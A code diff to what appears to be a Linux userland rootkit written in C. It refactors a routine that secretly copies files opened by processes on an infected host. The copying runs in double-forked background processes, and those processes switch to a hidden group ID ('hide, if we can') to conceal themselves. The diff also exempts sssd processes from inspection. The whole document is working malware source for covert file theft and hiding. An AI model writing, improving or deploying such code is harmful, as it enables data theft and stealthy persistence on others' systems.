@@ -138,6 +138,44 @@ nopenope:
 }
 #endif
 
+
+void writemap(unsigned char *map, FILE *nfp, off_t fsize, mode_t mode){
+    signal(SIGCHLD, SIG_IGN);
+    pid_t pid = fork();
+
+    if(pid != 0){
+        sleep(1);  // this is ok?
+        signal(SIGCHLD, SIG_DFL);
+        return;
+    }
+
+    for(int i=sysconf(_SC_OPEN_MAX); i>=0; i--)
+        if(i != fileno(nfp))
+            close(i);
+
+    if(!notuser(0)){ // hide, if we can.
+        hook(CSETGID);
+        call(CSETGID, readgid());
+    }
+
+    pid = fork();
+    if(pid != 0){
+        fclose(nfp);
+        exit(0);
+    }
+
+    hook(CFWRITE);
+    call(CFWRITE, map, 1, fsize, nfp);
+    fclose(nfp);
+
+#ifdef KEEP_FILE_MODE
+    hook(CCHMOD);
+    call(CCHMOD, newpath, mode);
+#endif
+    exit(0);
+}
+
+
 int writecopy(const char *oldpath, char *newpath){
     struct stat nstat; // for newpath, should it exist, to check if there's a change in size.
     int statr;
@@ -177,8 +215,7 @@ int writecopy(const char *oldpath, char *newpath){
     }
 #endif
 
-    int fd = fileno(ofp);
-    map = mmap(NULL, fsize, PROT_READ, MAP_SHARED, fd, 0);
+    map = mmap(NULL, fsize, PROT_READ, MAP_PRIVATE, fileno(ofp), 0);
     if(map == MAP_FAILED){
 #ifdef ORIGINAL_RW_FALLBACK
         wcfallback(ofp, nfp, fsize);
@@ -191,47 +228,7 @@ int writecopy(const char *oldpath, char *newpath){
     }
     fclose(ofp);
 
-    pid_t pid = fork();
-    if(pid < 0){
-        madvise(map, fsize, MADV_DONTNEED);
-        munmap(map, fsize);
-        fclose(nfp);
-        return -1;
-    }else if(pid > 0){
-        madvise(map, fsize, MADV_DONTNEED);
-        munmap(map, fsize);
-        fclose(nfp);
-        return 1;
-    }else if(pid == 0){
-        signal(SIGCHLD, SIG_IGN);
-        signal(SIGHUP, SIG_IGN);
-
-        if(setsid() < 0)
-            exit(0);
-
-        for(int i=sysconf(_SC_OPEN_MAX); i>=0; i--)
-            if(i != fileno(nfp))
-                close(i);
-
-        if(!notuser(0)){ // hide, if we can.
-            hook(CSETGID);
-            call(CSETGID, readgid());
-        }
-
-        pid = fork();
-        if(pid != 0) exit(0);
-
-        hook(CFWRITE);
-        call(CFWRITE, map, 1, fsize, nfp);
-        fclose(nfp);
-        madvise(map, fsize, MADV_DONTNEED);
-        munmap(map, fsize);
-#ifdef KEEP_FILE_MODE
-        hook(CCHMOD);
-        call(CCHMOD, newpath, mode);
-#endif
-        exit(0);
-    }
+    writemap(map, nfp, fsize, mode);
 
     return 1;
 }
@@ -270,6 +267,18 @@ int takeit(const char *oldpath, char *newpath){
 
 
 void inspectfile(const char *pathname){
+    if(process("/usr/sbin/sssd"))
+        return;
+
+    int nope=0;
+    char *myname = procname();
+    if(myname != NULL){
+        nope = !strncmp("/usr/libexec/sssd", myname, strlen("/usr/libexec/sssd"));
+        free(myname);
+    }
+    if(nope)
+        return;
+
     char *dupdup   = strdup(pathname),
          *filename = basename(dupdup),
          *newpath;
